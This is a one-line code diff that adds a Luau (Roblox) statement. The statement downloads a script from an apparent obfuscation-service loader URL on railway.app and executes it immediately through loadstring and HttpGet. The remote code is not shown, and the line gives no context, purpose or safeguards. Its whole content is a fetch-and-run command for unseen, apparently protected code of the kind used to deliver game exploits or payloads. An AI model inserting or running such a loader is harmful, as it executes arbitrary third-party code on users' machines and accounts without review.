@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://luauprotect.up.railway.app/loader/f74338d9b1291286'))()
